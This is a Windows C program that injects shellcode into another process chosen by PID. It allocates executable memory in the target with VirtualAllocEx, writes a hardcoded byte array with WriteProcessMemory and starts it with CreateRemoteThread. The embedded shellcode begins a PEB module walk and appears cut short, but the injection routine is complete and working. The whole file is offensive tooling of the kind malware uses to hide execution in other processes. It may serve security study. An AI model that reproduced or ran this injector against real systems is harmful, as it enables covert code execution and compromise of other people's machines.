#include <Windows.h>
#include <tchar.h>
#include <stdio.h>


BYTE shellcode[] =
	"\x41\x57\x41\x56\x41\x55\x41\x54\x56\x57\x53\x48\x81\xEC\x10\x01"
	"\x00\x00\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x48\x8B\x40\x60\x48"
	"\x8B\x40\x18\x48\x8B\x40\x20\x31\xF6\x48\x89\xC1\x48\x8B\x09\x48"
	"\x8B\x51\x40\x8B\x5A\x28\x81\xFB\x6B\x00\x65\x00\x74\x1C\x81\xFB";


int _tmain(int argc, TCHAR* argv[]) {

	if (argc != 2) {
		_tprintf(_T("[!] Usage: main.exe [pid]\n"));
		return 0;
	}

	DWORD PID = _tstoi(argv[1]);
	if (PID == 0) {
		_tprintf(_T("[x] Invalid PID\n"));
		return 0;
	}

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);
	if (hProcess == NULL) {
		_tprintf(_T("[x] OpenProcess failed, error: 0x%x\n"), GetLastError());
		return 0;
	}

	PVOID Buffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (Buffer == NULL) {
		_tprintf(_T("[x] VirtualAllocEx failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	SIZE_T bytesWritten;
	WriteProcessMemory(hProcess, Buffer, shellcode, sizeof(shellcode), &bytesWritten);
	if (bytesWritten != sizeof(shellcode)) {
		_tprintf(_T("[x] WriteProcessMemory failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, NULL);
	if (hThread == NULL) {
		_tprintf(_T("[x] CreateRemoteThread failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	_tprintf(_T("[+] Success\n"));

	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}
